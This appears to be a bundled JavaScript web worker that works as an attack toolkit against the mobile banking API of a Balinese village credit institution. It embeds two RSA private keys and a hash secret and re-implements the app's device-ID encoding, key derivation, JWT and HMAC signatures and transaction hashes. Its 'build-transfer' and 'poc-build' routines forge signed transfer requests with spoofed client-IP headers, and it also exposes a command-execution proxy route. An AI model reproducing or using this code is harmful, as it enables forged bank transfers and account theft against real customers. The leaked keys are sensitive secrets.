  const search = document.getElementById('th-search').value.trim();
  
  const dir  = (type === 'access' || type === 'tabungan') ? 'root' : 'root';
  const file = \`\${type}-\${date}.txt\`;
  
  document.getElementById('th-log-list').innerHTML = '<div style="text-align:center;padding:20px"><span class="spinner"></span></div>';

  const res = await callAdmin({ op: 'read-log', path: file, dir });
  if (!res.ok) {
    document.getElementById('th-log-list').innerHTML = \`<div class="info-box info-yellow"><i class="fas fa-exclamation-triangle"></i> \${res.error || 'File tidak ditemukan: '+file}</div>\`;
    document.getElementById('th-count').textContent = '0';
    return;
  }

  const entries = parseLogEntries(res.content || '');
  const cnt = renderLogEntries(entries, 'th-log-list', search);
  document.getElementById('th-count').textContent = String(cnt);
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   REFRESH ALL
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
function refreshAll() {
  const active = document.querySelector('.section.active');
  if (active?.id === 'section-dashboard') loadDashboard();
  else if (active?.id === 'section-stats') loadStats();
  else if (active?.id === 'section-errors') loadErrors();
  else if (active?.id === 'section-activity') loadActivity();
  else if (active?.id === 'section-logs-access') loadAccessLogs();
  else if (active?.id === 'section-logs-transfer') loadTransferLogs();
  else if (active?.id === 'section-logs-tabungan') loadTabunganLogs();
  else if (active?.id === 'section-logs-token') loadTokenLogs();
  else if (active?.id === 'section-trx-history') loadTrxHistory();
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   INIT
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
window.addEventListener('DOMContentLoaded', () => {
  // Set default dates
  const today = todayStr();
  ['act-date','acc-date','tr-date','tab-date','tok-date','th-date'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.value = today;
  });
  // Set trx mutasi default dates
  const tglawal  = document.getElementById('trx-mu-tglawal');
  const tglakhir = document.getElementById('trx-mu-tglakhir');
  if (tglawal)  tglawal.value  = today;
  if (tglakhir) tglakhir.value = today;
  
  updateClock();
  setInterval(updateClock, 10000);
  loadDashboard();
});
<\/script>
</body>
</html>`;
}
__name(Ua, "Ua");
var zt = `-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQD3KiZu/RXRO+R/
onutm7eR205pKykTggG7rWQyCJj/bMK6IqxESOHjO8Y4quWPnQCnO+TKwENJzrKj
z8S91zQgoHSfYYc2mJ5Rs93bUzvO5csPbzzQ+JwKxu3aFgvjDl4UxP6qmBf+dXC1
UplzVb52XwB7CowbXMLfLSEnljGIp/gkC0d081XafNo8TaeZJvFkQpJPSPNXVLaY
QDt+53+T7k2v0IlHsLuRM56AmYCa1i2w2H+qV66U+F1g4x9jRVu1NTXwVxNWBmNG
HrFK0YzoaMgF6f46PtkC+zGB4SrZ+G2fqV6rnySpJPSDO6DlEZuNzpmZgsNcl+ua
JEsRTSp/AgMBAAECggEBAMPvLRKVHOOGWCh6NRM2OzqsIKesaF6nlBokZSZovGjX
3jJSZD+pizBo5UVs7JiBfNAV4dR8v5rV+bV0cmGQJSmsKWdjmB3GtNLOBJTmkaX9
cpDkvNBoFMNSWaGmEnxHmntagwvXkEXO8a88MJtGoLsTqrzfapwSWAU1sG/CV7gc
6P6pOdldFS7TGeOQJK7pEvBdrPgN0sQ9LBbACxOWGOSfkv1i2bPgwCIuMBe5JV03
/ZfdCY7XwkCfy91EVRNQX/caYJ+EXxNUNHD4xN7us5H4guCcgZYz8G3xqeb9Vqr8
Z9gL9Ii7fMpOaciO0YgEkiplnYNu2KB40S7d5J0XG5ECgYEA/CBkbYLT1VzgJRDz
+QvALFpVF4u4ga5tAtDA8MqVM/YL4ay0xiJO6O9HZdwTLYbqnrHf2IfqrFw6ol25
Ya4cHVZutUtlXIf7Zv4/HzZh0aJfSnMs5eOg1BSuC1bXph5PWrOXmBSTZm/J615J
9TzyLJTlgACgB2lX1xiTRx+UShcCgYEA+vY+LF2eEpy0FdbbmFBrZbpyz9vZHvr+
PTpr346a9FJtSBm6Am5/4DBAvKbTHqHe5pLeNu9o1uqngUQtCS80N0MqLY6LLdm9
TxtT0Rg1R1hd+UnBTqBa7EJhHb+pAS+jrdnxKZhzOn4Rq1WJT1calDb5T9+sPYXh
r2KIUiTrq9kCgYEAwfVlbP3VWvGdGcbF+ZR5nWVMytVY9qKqCB1yIIuoZpXlJBKJ
61bfX8EcKxc3xbFh8v2h1+EPvtMg5GG3yJZ52HPyrRO4gYu28s+q3acnb287YXnj
U2NfCWhzUBPZyFjO8VbxyzQhBRAAxUn/GWNuZq+RMnzIn4sB4V5thqyblrcCgYEA
vmiua4LsODrk99z45+u8UIbSLZskdTkCRPpadlgAgXc4qwe59bZZF4QE2h3I+Ojf
8hlkuFGVPdr0FEPh16IVAAjZq48HUlZuJ+MYCQFRCzyksEuhe0J3OeJzRNryI5A9
o95D98dPRgX46gIQGD6CUAoVxuByEovN2//qZkjU9qECgYBTGQALqhaSSZUAyPaJ
LIU0rIaMxiyLBc2bDtFLUSmSfvOA83BZCRN452obnM3pgQYTD5/AvultHlJwraVL
1O9CH97AwrE9TUsc+hlrIVGGZFUHfZr2Buj5TZUFOR+/gKszBcgpvROwnqklTsId
tZ4umdUY0ubwdxMbJQU3S2pX2A==
-----END PRIVATE KEY-----`;
var Xa = `-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDLhEUdMTZ3/dJz
FEE5zvwulheeHaoLI9WxPB9Xm4tnKMWWn0aS0EtNZWyAU9HQV6VEY0JoE4f8f3g6
hMkdMcmN37eUJ7imef3HIBenVQNUZnyABIOAdLuaetClNlWm5944+H+BZFnpudCO
+Hj1U2W+U7T5C3pl5T8+GhxCsgqzUvXKRewNIMOzDnmrxCwqb/M8xIjDvx4oGN1o
BFnPj8rbd0/arsAPdcUZiYRb6UXRNCtbBGjCNInZ91t+MND8S52irVmd47Ow3FoZ
GjCUAj4rNzEHRh06XjNMMk77G85y1mYM7nn1hUhf3l0DUN8TwGhC9vVg+M+tt/fr
l7y3xtoHAgMBAAECggEACQQ1qart/lfs9HM/xodgjdHRfwxSZcbzJzSCMPfvr6TT
SC6LSmLXCzlEmtTb1U6kwEhjf0fqPOoK0hDi9huoEdSJBhPSbvG1qBZIZf3ytVEL
EALjLpQ9YYUybDdhiRD5u+1qfLmM8Dluv37LoRbOSaXcvTHgfNYwvJgci2nm5nXg
t8UiU8OHXgV8GHdLm9GbBB3bB00nacRznfuxBNem2nCDvDnFqSEV0jWjugj6psdM
83h9Ye4HB77y7OpaofpLsOJQFZYZRNBmw1ypdQrnbLKwdKLk869VRI7ZwHdqkZHw
J+sLpPtwCC2cdajRPVNYsGt0yRchGg0h9+7y4TQhTQKBgQDssg/9897n557giRHj
3MSibvxASeHJ+G8qgszr7W5+Y05Bgd7bZrIPN/KNEJ3ADbnt5mA0UIgGLRIvoJE4
exnodmhueVTZCIQq6JEed/GVbNqAMejy+byeJM6KNkFbhd/ypf+MCzKURc9w2IYA
sYU46rgIpMwSpAgUSKywKQ2oWwKBgQDcHXhE3cy2wlLM8H5YE17MkvwR4qNLYEzd
1vMvlq+hi3srpF9mJQ/OGhDSYTsmj9vHgUyIhUytfNg9Sog6AHkcLt6wV7lonjvr
UeoHbE+/TlUuzIQgz7R/yEndE2XA6affM7BpZOpajjV8CSzsCZG40k24GALAuZvI
6kxy3V6kxQKBgQC3zosmrdQDCNZTDX6MEavNbByNnBIv8rH5NDwIVohAs8NYkY7L
mFNcCBlePHIUa1Rgj09UMNmA2k1OGQXM86Op5xGwAJ7IL5nbbGENZR2A6VhAxwFc
dl1n/bM6l2lntm2zk/7/9M4hYJj3y907+p83FOc3JyqmqyTvA4S/BBJsEwKBgQCi
ds3yZpNWwY9D3K4kbAeoj0SmHtXQKMATbTgJg/sWDVFYIPaY+fn0caDA5ys1hzD8
zB6lFV5HHsKsWnq59OdvOdj754PeCAzJ36gQ2ozx8utEo4dSgHwFZNu/5TVRciSJ
xikLYYToWdZ4On2Bqn54ICFlI7PEdDrbzLOohGP60QKBgQDbG6zu4XXDO3EaZFr9
VTllOVESELjc6V6OWo0mBnKXylQ4j/ps7kY9Imz7jpyi22dtLfqwzirmi/lsIERv
MswoO11LenV8bbIamN/vBfLJKKYGen+lOerjBDSJhIWyPN1VrczVKm5Y0bGP4qgy
Utb/zmklYi3CbDFQwlX02oS4bQ==
-----END PRIVATE KEY-----`;
var Ze = "p91wrswK";
function ue(e) {
  if (!e || typeof e != "string") return new Uint8Array(0);
  const t = e.replace(/-/g, "+").replace(/_/g, "/"), s = t.padEnd(t.length + (4 - t.length % 4) % 4, "=");
  try {
    const a = atob(s);
    return Uint8Array.from(a, (i) => i.charCodeAt(0));
  } catch {
    return new Uint8Array(0);
  }
}
__name(ue, "ue");
function se(e) {
  return btoa(String.fromCharCode(...new Uint8Array(e)));
}
__name(se, "se");
function Le(e) {
  return Array.from(new Uint8Array(e)).map((t) => t.toString(16).padStart(2, "0")).join("");
}
__name(Le, "Le");
function G(e) {
  return new TextEncoder().encode(e);
}
__name(G, "G");
function Kt(e) {
  function t(y, p) {
    const w = (y & 65535) + (p & 65535);
    return (y >> 16) + (p >> 16) + (w >> 16) << 16 | w & 65535;
  }
  __name(t, "t");
  function s(y, p) {
    return y << p | y >>> 32 - p;
  }
  __name(s, "s");
  function a(y, p, w, v, T, S) {
    return t(s(t(t(p, y), t(v, S)), T), w);
  }
  __name(a, "a");
  function i(y, p, w, v, T, S, x) {
    return a(p & w | ~p & v, y, p, T, S, x);
  }
  __name(i, "i");
  function n(y, p, w, v, T, S, x) {
    return a(p & v | w & ~v, y, p, T, S, x);
  }
  __name(n, "n");
  function r(y, p, w, v, T, S, x) {
    return a(p ^ w ^ v, y, p, T, S, x);
  }
  __name(r, "r");
  function o(y, p, w, v, T, S, x) {
    return a(w ^ (p | ~v), y, p, T, S, x);
  }
  __name(o, "o");
  function d(y) {
    const p = [];
    for (let w = 0; w < y.length; w++) {
      const v = y.charCodeAt(w);
      v < 128 ? p.push(v) : v < 2048 ? p.push(v >> 6 | 192, v & 63 | 128) : v < 65536 ? p.push(v >> 12 | 224, v >> 6 & 63 | 128, v & 63 | 128) : p.push(v >> 18 | 240, v >> 12 & 63 | 128, v >> 6 & 63 | 128, v & 63 | 128);
    }
    return p;
  }
  __name(d, "d");
  const u = d(e), b = u.length;
  for (u.push(128); u.length % 64 !== 56; ) u.push(0);
  const l = b * 8;
  for (let y = 0; y < 8; y++) u.push(y < 4 ? l >>> y * 8 & 255 : l / 4294967296 >>> y * 4 * 8 & 255);
  let c = 1732584193, f = 4023233417, g = 2562383102, h = 271733878;
  for (let y = 0; y < u.length; y += 64) {
    const p = [];
    for (let x = 0; x < 16; x++) p[x] = u[y + x * 4] | u[y + x * 4 + 1] << 8 | u[y + x * 4 + 2] << 16 | u[y + x * 4 + 3] << 24;
    let [w, v, T, S] = [c, f, g, h];
    c = i(c, f, g, h, p[0], 7, -680876936), h = i(h, c, f, g, p[1], 12, -389564586), g = i(g, h, c, f, p[2], 17, 606105819), f = i(f, g, h, c, p[3], 22, -1044525330), c = i(c, f, g, h, p[4], 7, -176418897), h = i(h, c, f, g, p[5], 12, 1200080426), g = i(g, h, c, f, p[6], 17, -1473231341), f = i(f, g, h, c, p[7], 22, -45705983), c = i(c, f, g, h, p[8], 7, 1770035416), h = i(h, c, f, g, p[9], 12, -1958414417), g = i(g, h, c, f, p[10], 17, -42063), f = i(f, g, h, c, p[11], 22, -1990404162), c = i(c, f, g, h, p[12], 7, 1804603682), h = i(h, c, f, g, p[13], 12, -40341101), g = i(g, h, c, f, p[14], 17, -1502002290), f = i(f, g, h, c, p[15], 22, 1236535329), c = n(c, f, g, h, p[1], 5, -165796510), h = n(h, c, f, g, p[6], 9, -1069501632), g = n(g, h, c, f, p[11], 14, 643717713), f = n(f, g, h, c, p[0], 20, -373897302), c = n(c, f, g, h, p[5], 5, -701558691), h = n(h, c, f, g, p[10], 9, 38016083), g = n(g, h, c, f, p[15], 14, -660478335), f = n(f, g, h, c, p[4], 20, -405537848), c = n(c, f, g, h, p[9], 5, 568446438), h = n(h, c, f, g, p[14], 9, -1019803690), g = n(g, h, c, f, p[3], 14, -187363961), f = n(f, g, h, c, p[8], 20, 1163531501), c = n(c, f, g, h, p[13], 5, -1444681467), h = n(h, c, f, g, p[2], 9, -51403784), g = n(g, h, c, f, p[7], 14, 1735328473), f = n(f, g, h, c, p[12], 20, -1926607734), c = r(c, f, g, h, p[5], 4, -378558), h = r(h, c, f, g, p[8], 11, -2022574463), g = r(g, h, c, f, p[11], 16, 1839030562), f = r(f, g, h, c, p[14], 23, -35309556), c = r(c, f, g, h, p[1], 4, -1530992060), h = r(h, c, f, g, p[4], 11, 1272893353), g = r(g, h, c, f, p[7], 16, -155497632), f = r(f, g, h, c, p[10], 23, -1094730640), c = r(c, f, g, h, p[13], 4, 681279174), h = r(h, c, f, g, p[0], 11, -358537222), g = r(g, h, c, f, p[3], 16, -722521979), f = r(f, g, h, c, p[6], 23, 76029189), c = r(c, f, g, h, p[9], 4, -640364487), h = r(h, c, f, g, p[12], 11, -421815835), g = r(g, h, c, f, p[15], 16, 530742520), f = r(f, g, h, c, p[2], 23, -995338651), c = o(c, f, g, h, p[0], 6, -198630844), h = o(h, c, f, g, p[7], 10, 1126891415), g = o(g, h, c, f, p[14], 15, -1416354905), f = o(f, g, h, c, p[5], 21, -57434055), c = o(c, f, g, h, p[12], 6, 1700485571), h = o(h, c, f, g, p[3], 10, -1894986606), g = o(g, h, c, f, p[10], 15, -1051523), f = o(f, g, h, c, p[1], 21, -2054922799), c = o(c, f, g, h, p[8], 6, 1873313359), h = o(h, c, f, g, p[15], 10, -30611744), g = o(g, h, c, f, p[6], 15, -1560198380), f = o(f, g, h, c, p[13], 21, 1309151649), c = o(c, f, g, h, p[4], 6, -145523070), h = o(h, c, f, g, p[11], 10, -1120210379), g = o(g, h, c, f, p[2], 15, 718787259), f = o(f, g, h, c, p[9], 21, -343485551), c = t(c, w), f = t(f, v), g = t(g, T), h = t(h, S);
  }
  function k(y) {
    let p = "";
    for (let w = 0; w < 4; w++) p += (y >>> w * 8 & 255).toString(16).padStart(2, "0");
    return p;
  }
  __name(k, "k");
  return k(c) + k(f) + k(g) + k(h);
}
__name(Kt, "Kt");
async function it(e, t) {
  const s = t.slice(-8), a = s.split(":").map(Number), i = await crypto.subtle.importKey("raw", G(t), { name: "HMAC", hash: "SHA-512" }, false, ["sign"]), n = new Uint8Array(await crypto.subtle.sign("HMAC", i, G(e))), r = n.length, o = a[0], d = Math.floor((r + a[1]) / 2) - 16, u = Math.floor((r + a[2]) / 3) - 8, b = se(n.slice(o, o + 32)), l = se(n.slice(d, d + 16)), c = se(n.slice(u, u + 8));
  return { aesKey: b, aesIv: l, aesCs: c, times: a, kStart: o, ivStart: d, csStart: u, debug: { lastEight: s, times: a, kStart: o, ivStart: d, csStart: u, keyBytesHex: Le(n).slice(0, 32) + "..." } };
}
__name(it, "it");
async function I(e, t, s) {
  const a = await crypto.subtle.importKey("raw", ue(t), "AES-CBC", false, ["encrypt"]), i = ue(s), n = await crypto.subtle.encrypt({ name: "AES-CBC", iv: i }, a, G(e));
  return se(n);
}
__name(I, "I");
async function ot(e, t, s) {
  try {
    const a = await crypto.subtle.importKey("raw", ue(t), "AES-CBC", false, ["decrypt"]), i = ue(s), n = await crypto.subtle.decrypt({ name: "AES-CBC", iv: i }, a, ue(e));
    return new TextDecoder().decode(n);
  } catch {
    return null;
  }
}
__name(ot, "ot");
function $a(e) {
  const t = e.endsWith("==") ? "==" : e.endsWith("=") ? "=" : "", s = e.substring(7, 13), a = parseInt(s[0]) * 10 + s.charCodeAt(1) - 64, i = 100 + parseInt(s[2]) * 10 + s.charCodeAt(3) - 64, n = 100 + parseInt(s[4]) * 10 + s.charCodeAt(5) - 64, r = e.substring(16, 20), o = r.charCodeAt(0) - 64, d = r.charCodeAt(1) - 64, u = parseInt(r.slice(2)), b = e.substring(a, a + o) + e.substring(i, i + d) + e.substring(n, n + u), l = atob((b + t).replace(/-/g, "+").replace(/_/g, "/")), c = l.split("|");
  return { app: c[0] || "", clientID: c[1] || "", regTime: c[2] || "", rawDecoded: l, parts: c, debug: { col1: a, col2: i, col3: n, len1: o, len2: d, len3: u, idd: b.slice(0, 20) + "..." } };
}
__name($a, "$a");
function Fa(e, t, s = "Seminyak") {
  const a = `${s}|${e}|${t}`, i = btoa(a), n = i.endsWith("==") ? "==" : i.endsWith("=") ? "=" : "", r = i.slice(0, i.length - n.length), o = r.length, d = 69, u = 135, b = 175, l = Math.floor(o / 3), c = l, f = l, g = o - c - f, h = r.slice(0, c), k = r.slice(c, c + f), y = r.slice(c + f), p = /* @__PURE__ */ __name((x) => String(Math.floor(x / 10)) + String.fromCharCode(x % 10 + 64), "p"), w = p(d) + p(u - 100) + p(b - 100), v = String.fromCharCode(c + 64) + String.fromCharCode(f + 64) + String(g).padStart(2, "0"), T = b + g + 200, S = new Array(T + 100).fill("A");
  S[7] = w[0], S[8] = w[1], S[9] = w[2], S[10] = w[3], S[11] = w[4], S[12] = w[5], S[16] = v[0], S[17] = v[1], S[18] = v[2], S[19] = v[3];
  for (let x = 0; x < h.length; x++) S[d + x] = h[x];
  for (let x = 0; x < k.length; x++) S[u + x] = k[x];
  for (let x = 0; x < y.length; x++) S[b + x] = y[x];
  return S.join("").slice(0, b + g) + n;
}
__name(Fa, "Fa");
function Ga(e) {
  const t = e.split(".");
  if (t.length < 2) return { error: "Bukan format JWT valid" };
  try {
    const s = JSON.parse(atob(t[0].replace(/-/g, "+").replace(/_/g, "/"))), a = JSON.parse(atob(t[1].replace(/-/g, "+").replace(/_/g, "/")));
    return { header: s, payload: a, signatureB64: t[2] || "", raw: { headerB64: t[0], payloadB64: t[1] } };
  } catch (s) {
    return { error: s instanceof Error ? s.message : String(s) };
  }
}
__name(Ga, "Ga");
async function dt(e) {
  const t = e.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
  return ue(t).buffer;
}
__name(dt, "dt");
async function et(e, t, s = zt) {
  const a = btoa(JSON.stringify({ trans_no: e, alg: "RS256" })).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, ""), i = btoa(JSON.stringify({ trans_time: t })).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, ""), n = `${a}.${i}`, r = await dt(s), o = await crypto.subtle.importKey("pkcs8", r, { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" }, false, ["sign"]), d = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", o, G(n)), u = se(d).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
  return `${n}.${u}`;
}
__name(et, "et");
async function Ut(e, t, s) {
  const a = ue(s), i = a.length >= 8 ? a : new Uint8Array(8), n = G(`${e}:${t}`), r = await crypto.subtle.importKey("raw", i, { name: "HMAC", hash: "SHA-512" }, false, ["sign"]), o = await crypto.subtle.sign("HMAC", r, n);
  return se(o);
}
__name(Ut, "Ut");
async function Ee(e, t, s) {
  const a = G(s), i = G(`${e}:${t}`), n = await crypto.subtle.importKey("raw", a, { name: "HMAC", hash: "SHA-512" }, false, ["sign"]), r = await crypto.subtle.sign("HMAC", n, i);
  return se(r);
}
__name(Ee, "Ee");
function Ya(e) {
  return Le(ue(e));
}
__name(Ya, "Ya");
async function Xt(e) {
  const t = `%${e.fromAcc}#${e.amount}@${e.dateTime}^${e.refNo}*${e.destBank}~${e.destAcc}|${Ze}%`;
  return Le(await crypto.subtle.digest("SHA-256", G(t)));
}
__name(Xt, "Xt");
async function $t(e) {
  const t = `@${e.fromAcc}|${e.amount}~${e.dateTime}*${e.refNo}^${e.destBank}#${e.destAcc}(${e.destName})${Ze}@`;
  return Le(await crypto.subtle.digest("SHA-256", G(t)));
}
__name($t, "$t");
async function Ja(e) {
  const t = `{${e.nominal}*${e.norekFrom}^${e.norekTo}%${e.nameFrom}#${e.nameTo}@${Ze}}`;
  return Le(await crypto.subtle.digest("SHA-256", G(t)));
}
__name(Ja, "Ja");
async function lt(e) {
  const t = Le(await crypto.subtle.digest("SHA-256", G(`Seminyak|${e}`))), s = await dt(zt), a = await crypto.subtle.importKey("pkcs8", s, { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" }, false, ["sign"]), i = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", a, G(t));
  return { signature: se(i), timestamp: e, clientStamp: t };
}
__name(lt, "lt");
async function Ft(e, t) {
  const s = `${e}|${t}`, a = await dt(Xa), i = await crypto.subtle.importKey("pkcs8", a, { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" }, false, ["sign"]), n = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", i, G(s));
  return { signature: se(n), clientKey: e, timestamp: t, message: s };
}
__name(Ft, "Ft");
function F() {
  const e = /* @__PURE__ */ new Date();
  return new Date(e.getTime() + 7 * 36e5).toISOString().replace("T", " ").slice(0, 19);
}
__name(F, "F");
function ke() {
  const e = /* @__PURE__ */ new Date();
  return new Date(e.getTime() + 7 * 36e5).toISOString().slice(0, 19) + "+07:00";
}
__name(ke, "ke");
function X(e = "SMY") {
  const t = new Date((/* @__PURE__ */ new Date()).getTime() + 252e5), s = t.toISOString().slice(11, 19).replace(/:/g, "").slice(0, 6), a = String(Math.floor(Math.random() * 9e3) + 1e3), i = t.toISOString().slice(0, 10).replace(/-/g, "");
  return `${e}${s}${a}O1012${i.slice(4)}`;
}
__name(X, "X");
async function Va(e) {
  const t = e.timestamp || F(), s = e.refNo || X(), a = await I(e.fromAcc, e.aesKey, e.aesIv), i = await I(String(e.amount), e.aesKey, e.aesIv), n = await I(e.dateTime, e.aesKey, e.aesIv), r = await I(e.destName || "", e.aesKey, e.aesIv);
  let o, d, u;
  e.step === "posting" ? (o = await $t({ ...e, refNo: s }), d = await I(`${e.destBank}-${e.destAcc}`, e.aesKey, e.aesIv), u = await I(o, e.aesKey, e.aesIv)) : (o = await Xt({ ...e, refNo: s }), d = await I(`${e.destBank}-${e.destAcc}-${o}`, e.aesKey, e.aesIv), u = null);
  const b = await et(s, ke()), l = await Ut(b, t, e.aesCs), c = l, f = { from_acc: a, to_acc: d, amount: i, date_time: n, to_name: r, hash_code: u || "", remark: e.remark || "" };
  return { headers: { "Content-Type": "application/json", Authorization: b, "X-TIMESTAMP": t, "X-SIGNATURE": l, "X-PARTNER-ID": c, "X-CLIENT-ID": e.didEncoded || "", "X-REFERENCE": s, "X-Forwarded-For": "34.50.74.78", "X-Real-IP": "34.50.74.78" }, body: f, url: `${e.baseUrl || "https://lpdseminyak.biz.id:8000"}/api/smart/transfer/bank/post`, refNo: s, ts: t, debug: { hashRaw: o, step: e.step || "check" } };
}
__name(Va, "Va");
async function Wa(e, t, s) {
  const a = {};
  for (const [i, n] of Object.entries(e)) n && typeof n == "string" && (a[i] = await ot(n, t, s));
  return a;
}
__name(Wa, "Wa");
async function Qa(e) {
  const t = e.op;
  try {
    let s;
    if (t === "keygen") s = await it(e.clientID, e.timestamp);
    else if (t === "encrypt") s = { encrypted: await I(e.plaintext, e.aesKey, e.aesIv), plaintext: e.plaintext };
    else if (t === "decrypt") s = { decrypted: await ot(e.ciphertext, e.aesKey, e.aesIv), ciphertext: e.ciphertext };
    else if (t === "did-decode") s = $a(e.did);
    else if (t === "did-encode") s = { encoded: Fa(e.clientID, e.timestamp, e.appName || "Seminyak"), clientID: e.clientID, timestamp: e.timestamp };
    else if (t === "jwt-decode") s = Ga(e.jwt);
    else if (t === "hashcode") {
      const a = e.step || "check";
      let i;
      a === "posting" ? i = await $t(e) : a === "lpd" ? i = await Ja(e) : i = await Xt(e);
      const n = Ze;
      s = { hash: i, step: a, formula: a === "posting" ? `SHA256("@"+fromAcc+"|"+amount+"~"+dateTime+"*"+refNo+"^"+destBank+"#"+destAcc+"("+destName+")${n}@")` : `SHA256("%"+fromAcc+"#"+amount+"@"+dateTime+"^"+refNo+"*"+destBank+"~"+destAcc+"|${n}%")` };
    } else if (t === "reference") {
      const a = [];
      for (let i = 0; i < (parseInt(e.count) || 3); i++) a.push(X(e.prefix || "SMY"));
      s = { references: a };
    } else if (t === "signature") s = { signature: await Ut(e.token, e.timestamp, e.aesCs) };
    else if (t === "sig-decode") {
      const a = Ya(e.signature);
      s = { hex: a, length: a.length };
    } else if (t === "ios-token-sig") s = await lt(e.timestamp || F());
    else if (t === "snap-token-sig") s = await Ft(e.clientKey || "LPD-SEMINYAK-001", e.timestamp || ke());
    else if (t === "build-transfer") s = await Va({ ...e, timestamp: e.timestamp || F(), refNo: e.refNo || X() });
    else if (t === "decrypt-body") {
      const a = JSON.parse(e.body || "{}");
      s = { decrypted: await Wa(a, e.aesKey, e.aesIv) };
    } else if (t === "timestamp") s = { jakarta: F(), jakartaISO: ke(), utc: (/* @__PURE__ */ new Date()).toISOString() };
    else if (t === "partner-id") s = { partnerId: await Ee(e.token || e.authToken || "", e.timestamp || F(), e.aesCs || "") };
    else if (t === "poc-build") {
      const a = e.timestamp || F(), i = e.timestampISO || ke(), n = e.action || "register", r = e.ref || X(), o = await et(r, i);
      let d = e.aesCs || "";
      if (n === "register" && e.imei) d = (await it(e.imei, a)).aesCs, s = { action: n, ts: a, tsISO: i, ref: r, jwt: o.slice(0, 30) + "...", aesCs: d, partnerId: await Ee(o, a, d), headers: { Authorization: o, "X-TIMESTAMP": a, "X-PARTNER-ID": await Ee(o, a, d), "X-CLIENT-ID": e.clientIdEnc || "(encode IMEI first)", "X-REFERENCE": r } };
      else {
        const u = await Ee(o, a, d);
        s = { action: n, ts: a, tsISO: i, ref: r, jwt: o.slice(0, 30) + "...", aesCs: d, partnerId: u, headers: { Authorization: o, "X-TIMESTAMP": a, "X-PARTNER-ID": u, "X-CLIENT-ID": e.clientIdEnc || "(encode IMEI first)", "X-REFERENCE": r } };
      }
    } else return { ok: false, error: `Unknown operation: ${t}` };
    return { ok: true, op: t, result: s };
  } catch (s) {
    return { ok: false, op: t, error: s instanceof Error ? s.message : String(s) };
  }
}
__name(Qa, "Qa");
var K = new Ht();
K.use("/static/*", Ha({ root: "./public" }));
K.get("/favicon.ico", (e) => e.body(null, 204));
K.post("/api/exec", async (e) => {
  try {
    const t = await e.req.json(), a = await (await fetch("http://127.0.0.1:3001/exec", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(t) })).json();
    return e.json(a);
  } catch (t) {
    const s = t instanceof Error ? t.message : String(t);
    return e.json({ stdout: "", stderr: "Terminal server tidak tersedia: " + s, cwd: "/home/user", exitCode: 1 }, 500);
  }
});
K.get("/api/exec/health", async (e) => {
  try {
    const s = await (await fetch("http://127.0.0.1:3001/health")).json();
    return e.json({ ok: true, ...s });
  } catch {
    return e.json({ ok: false, error: "Terminal server tidak tersedia di production. Gunakan sandbox URL untuk operasi crypto.", sandbox_only: true });
  }
});
K.post("/api/crypto", async (e) => {
  try {
    const t = await e.req.json(), s = await Qa(t);
    return e.json(s);
  } catch (t) {
    const s = t instanceof Error ? t.message : String(t);
    return e.json({ ok: false, error: "Crypto error: " + s });
  }
});
function Za(e) {
  return e ? e.split("{#}").filter(Boolean).map((t) => {
    const s = t.split("<>");
    return { norek: s[0] || "", nama: s[1] || "", saldo: s[2] || "", produk: s[3] || "" };
  }) : [];
}
__name(Za, "Za");
var Ne = "34.50.74.78";
async function $(e, t, s, a) {
  if (!t) throw new Error("X-CLIENT-ID (clientIdEnc) wajib diisi \u2014 jalankan Derive AES Keys terlebih dahulu");
  const i = F(), n = ke(), r = s || X(), o = await et(r, n), d = X(), u = a && a.trim() ? a.trim() : o, b = await Ee(u, i, e || ""), l = b;
  return { jwt: o, ts: i, tsISO: n, sig: l, xref: d, headers: { "Content-Type": "application/json", Authorization: u, "X-TIMESTAMP": i, "X-SIGNATURE": l, "X-PARTNER-ID": b, "X-CLIENT-ID": t, "X-REFERENCE": d, "X-Forwarded-For": Ne, "X-Real-IP": Ne } };
}
__name($, "$");
async function es(e, t, s) {
  try {
    if (!t) return { ok: false, error: "clientIdEnc (X-CLIENT-ID) wajib diisi \u2014 jalankan Auto Setup terlebih dahulu" };
